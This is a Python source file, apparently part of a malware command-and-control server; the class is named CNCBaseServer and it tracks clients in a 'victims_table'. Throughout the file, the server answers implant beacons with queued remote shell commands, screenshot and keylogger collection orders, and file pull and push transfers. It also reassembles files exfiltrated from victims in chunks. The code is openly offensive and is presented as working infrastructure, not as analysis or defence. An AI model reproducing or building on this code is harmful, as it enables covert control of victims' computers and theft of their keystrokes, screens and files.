from abc import abstractmethod
from http.server import BaseHTTPRequestHandler
from setting import *
from ddp import DDP, TYPE_CODE, DDPParseError, ERROR_CODE
from mixin import SEQFileMixin , SEQNumError, SEQSaveError

from datetime import datetime

import logging
import os

logger = logging.getLogger(LOGGER_NAME)

class DDPSeqHandlerMixin(SEQFileMixin):

    def _seq_handler(self) -> bool:
        try:
            data = self.body['data']
            seq_name = ""
            is_ftp = True if self.body['type'] == 'FTP_RESPONSE' else False

            # 마지막 시퀀스 데이터일시
            if self.body['sequence'] == 0xffffffff:
                if not self._gather_seq_file(self.body['sequence'], data, is_ftp):
                    self._response_error(ERROR_CODE.SEQ_ERROR)
                    return True

                seq_name = self.victims_table[self.client_ip]['seq_name']

                if not self._merge_seq_files(seq_name):
                    self._response_error(ERROR_CODE.SEQ_ERROR)
                    return True
                
                return False
            # 시퀀스 처리
            else:
                if not self._gather_seq_file(self.body['sequence'], data, is_ftp):
                    self._response_error('seq saving error')
                    return True
            self._response_ack()
            return True
        except ConnectionResetError as e:
            self._delete_tmp_files(seq_name)
            # TODO log
            pass

    def _gather_seq_file(self, seq_num : int, data : bytes, is_ftp : bool):
        client_ip = self.client_ip

        if not is_ftp and seq_num == 1:
            self.victims_table[client_ip]['seq_name'] = str(client_ip) + datetime.now().strftime('_%Y%m%d-%H%M%S.seq')

        seq_name = ""
        try:
            seq_name = self.victims_table[client_ip]['seq_name']

            #만약 시퀀스 명이 fullpath이면 \ 를 제거
            if '\\' in seq_name:
                seq_name = seq_name.split('\\')[-1]

            self._save_seq_file(seq_name, seq_num, data)
        except SEQNumError as seq_e:
            logger.error('seq gather error : {}'.format(str(seq_e)))
            return False
        except Exception as e:
            logger.error('seq gather error : {}'.format(str(e)))
            return False

        if not seq_name:
            logger.error('seq name is not exist in queue..!')
            return False

        logger.info('{} seq datas in'.format(seq_num))

        return True


class DDPRequestHandlerMixin:
    def _handler_error(self, data):
        # TODO error handling
        try:
            data = int(data)
        except:
            return self._response_error(ERROR_CODE.INVALID_HEADER_ERROR)
        
        # 파일 전송 도중 오류가 발생한다면 생성한 파일들 삭제
        if data == ERROR_CODE.SENDING_FILE_ERROR.value and self.victims_table[self.client_ip]['seq_name']:
            seq_name = self.victims_table[self.client_ip]['seq_name']
            if os.path.isfile(FILE_PATH+seq_name):
                os.remove(FILE_PATH+seq_name)
            self._delete_tmp_files(seq_name)            
            self.victims_table[self.client_ip]['seq_name'] = ""

            logger.info("{0} : {1}".format(self.client_ip, ERROR_CODE.SENDING_FILE_ERROR.name))

        self._response_ack()

    def _handler_beacon_request(self, data):
        data = self._pop_command()

        if data:
            client_ip = self.client_ip

            if data.startswith('[') and data.endswith(']'):
                # screenshot 명령어 처리
                if data == "[screenshot]":
                    self._response_ftp_request("screenshot", datetime.now().strftime('%Y%m%d-%H%M%S.bmp'))
                    return
                elif data == "[keylog]":
                    self._response_ftp_request("keylog", "{}_{}_keylog.txt".format(client_ip, datetime.now().strftime('%Y%m%d-%H%M%S')))
                    return
                # gf 명령어 처리
                elif data.startswith('[get file'):
                    file_name = data.split(' ')
                    if len(file_name) == 4:
                        self._response_ftp_request(file_name[len(file_name)-2], file_name[len(file_name)-1][:-1])
                    else:
                        self._response_ftp_request(file_name[len(file_name)-1][:-1], file_name[len(file_name)-1][:-1])
                    return
                elif data.startswith('[send file'):
                    file_name = data.split(' ')
                    self._response_shell_request(" ".join(file_name[1:])[:-1])
            # shell 명령어 처리
            else:
                self._response_shell_request(data)
                return
        # 명령어가 존재하지 않으면 ack response
        else:
            self._response_ack()
        
    
    def _handler_shell_response(self, data):
        
        try:
            result = data.decode(ENCODING)
            command = result.split('\n', 1)[0]
            result = result.split('\n', 1)[1]

            print()
            print("=='{}' command result==\n{}".format(command, result))


            logger.info("sh result : '{}'".format(data.decode(ENCODING)))
        except UnicodeDecodeError as e:
            print(data.decode('utf-8'))
            logger.error('receive shell response error : decode result({}) result fail : {}'.format(data, str(e)))
            self._response_error(ERROR_CODE.DATA_DECODING_ERROR)
        except Exception as e:
            logger.error('receive shell response error : unknown error : ' + str(e))
            self._response_error(ERROR_CODE.UNKNOWN_ERROR)

        self._response_ack()
        
    def _handler_ftp_request(self, data):
        sending_file = self.victims_table[self.client_ip]['sending_file']

        if sending_file == "":
            self._response_ddp_error('there is no file to send')
            return;
        
        try:
            seq, data = self._get_sending_seq_data(self.client_ip + '_' + sending_file)
            if seq == "0" or seq == str(0xffffffff):
                self.victims_table[self.client_ip]['sending_file'] = ""

            self._response_ftp_response(data, int(seq))
        except Exception as e:
            logger.error('load sending file error {}'.format(str(e)))
            self._delete_tmp_files(self.clinet_ip + '_' + sending_file)
     
    def _handler_ftp_response(self, data):
        client_ip = self.client_ip
        file_name = ""
        
        try:
            file_name = self.victims_table[client_ip]['seq_name']
            self.victims_table[client_ip]['seq_name'] = "" 

            #만약 파일명이 fullpath이면 \ 를 제거
            if '\\' in file_name:
                file_name = file_name.split('\\')[-1]

            if not os.path.isfile(FILE_PATH+file_name):
                raise SEQSaveError('SEQSaveError : file not found')

            logger.info('{} file saved'.format(file_name))
            self._response_ack()
        except Exception as e:
            self._response_error(ERROR_CODE.FILE_ERROR)
            if not file_name:
                logger.error('{0} seq name queue is empty!'.format(client_ip))
                return
            logger.error('{0} seq save error : {1}'.format(file_name, str(e)))


class DDPResponseHandlerMixin:
    def _response_error(self, error_code : ERROR_CODE):
        # p_type, seq, data=b''
        data = {
            'p_type' : TYPE_CODE.ERROR.value,
            'seq' : 0,
            'data' : error_code.value.to_bytes(1, byteorder='little')
        }
        self._response_writer(data)

    # ack 응답
    def _response_ack(self):
        data = {
            'p_type' : TYPE_CODE.ACK.value,
            'seq' : 0,
            'data' : b''
        }

        self._response_writer(data, logging=False)

    # shell request 응답
    def _response_shell_request(self, command, seq=0):
        data = {
            'p_type' : TYPE_CODE.SHELL_REQUEST.value,
            'seq' : seq,
            'data' : command.encode(ENCODING)
        }

        self._response_writer(data)

    # ftp request 응답
    def _response_ftp_request(self, data, file_name):
        data = {
            'p_type' : TYPE_CODE.FTP_REQUEST.value,
            'seq' : 0,
            'data' : data.encode(ENCODING)
        }

        self.victims_table[self.client_ip]['seq_name'] = file_name

        self._response_writer(data)

    def _response_ftp_response(self, data, seq):
        data = {
            'p_type' : TYPE_CODE.FTP_RESPONSE.value,
            'seq' : seq,
            'data' : data
        }

        self._response_writer(data, logging=False)


class CNCBaseServer(BaseHTTPRequestHandler, DDPSeqHandlerMixin, DDPResponseHandlerMixin, DDPRequestHandlerMixin):

    """
        override functions
    """

    # 요청 파싱 시 ddp파싱 결과와 client ip를 얻어옴
    def parse_request(self) -> bool:
        super().parse_request()

        self.client_ip = self.address_string()
        self.body = self.rfile.read(int(self.headers['Content-Length'])) 

        if self.command == 'POST':
            try:
                self.body = DDP.parse(self.body)
            except DDPParseError as e:
                logger.error("{0} : {1}".format(self.client_ip, e))

        return True

    def log_request(self, code='-', size='-') -> None:
        # format - [ip] : [method] [status] / [body]

        if self.body['type'] == 'BEACON_REQUEST':
            return
        elif self.body['type'] == 'FTP_RESPONSE':
            self.log_message(
                '%s : %s %s / %s', 
                self.client_ip,
                self.command,
                code,
                'FILE DATA'
            ) 
            return

        self.log_message(
            '%s : %s %s / %s', 
            self.client_ip,
            self.command,
            code,
            self.body
        )

    def log_message(self, format: str, *args) -> None:
        #log_path_update()
        logger.info(format % args)        

    """
        custom functions
    """

    # get 요청 처리
    @abstractmethod
    def do_GET(self):
        pass

    # post 요청 처리
    @abstractmethod
    def do_POST(self):
        pass

    # 응답에 필요한 필수 헤더와 status code 설정 후 응답 전송
    def _response_writer(self, data : dict, content_type='text/plain', additional_header={}, logging=True):            
        response_data = DDP.raw(**data)

        self.send_response(200)
        self.send_header('Content-Type', '{0}; charset={1}'.format(content_type, ENCODING))

        if len(additional_header) > 0:
            for key, val in additional_header.items():
                self.send_header(key, val)
        self.end_headers()

        self.wfile.write(response_data)

        if logging:
            try:
                logger.info('response / {}'.format(data))
            except:
                logger.info('response unknown data')
    
    def _pop_command(self):
        command = ""

        command_queue = self.victims_table[self.client_ip]['command']
        
        while command_queue:
            element = command_queue[0]
            if element.startswith('[') and element.endswith(']'):
                if command == "":
                    return command_queue.popleft()
                else:
                    break
            if len(command + element) > SEQ_SIZE:
                break
            element = command_queue.popleft()
            # victim_table[self.client_ip]['shQueue'].append(element)
            command += element + ";"

        return command[:-1]
